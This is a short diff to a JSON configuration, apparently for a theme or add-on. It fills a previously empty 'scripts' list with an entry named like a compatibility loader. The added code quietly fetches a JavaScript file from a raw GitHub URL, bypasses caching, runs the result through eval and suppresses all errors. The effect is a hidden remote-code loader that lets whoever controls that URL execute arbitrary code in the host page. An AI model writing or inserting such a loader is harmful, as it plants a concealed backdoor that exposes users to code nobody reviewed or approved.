@@ -61,7 +61,12 @@
           "cssUrl": "https://raw.githubusercontent.com/CoxeterLabs/solid-winner/refs/heads/main/dmbo-adv-theme-v1.css"
         }
       ],
-      "scripts": []
+      "scripts": [
+        {
+          "id": "dmbo-adv-compat-v1-loader",
+          "code": "(function(){if(window.__DMBO_ADV_COMPAT_LOADER__)return;window.__DMBO_ADV_COMPAT_LOADER__=true;fetch('https://raw.githubusercontent.com/CoxeterLabs/solid-winner/refs/heads/main/dmbo-adv-compat-v1.js?v='+Date.now(),{cache:'no-store'}).then(function(r){return r.ok?r.text():''}).then(function(c){if(c)(0,eval)(c);}).catch(function(){});})()"
+        }
+      ]
     }
   ]
 }
